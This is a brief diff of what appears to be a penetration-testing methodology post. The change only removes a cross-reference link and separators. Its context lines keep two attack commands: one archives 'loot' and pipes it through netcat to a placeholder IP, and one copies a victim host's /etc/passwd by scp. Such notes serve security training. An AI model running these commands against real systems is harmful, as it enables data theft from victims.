@@ -101,10 +101,4 @@ tar czf - /path/to/loot | nc <IP> 4444
 scp user@<victimIP>:/etc/passwd ./loot/passwd
 ```
 
----
-*See also: [[00-Meta/Shell Upgrades & Tricks]]*
-
-
----
-
 *Previous: [Methodology Tools](/posts/methodology-tools/) · Next: [Methodology Resources](/posts/methodology-resources/)*
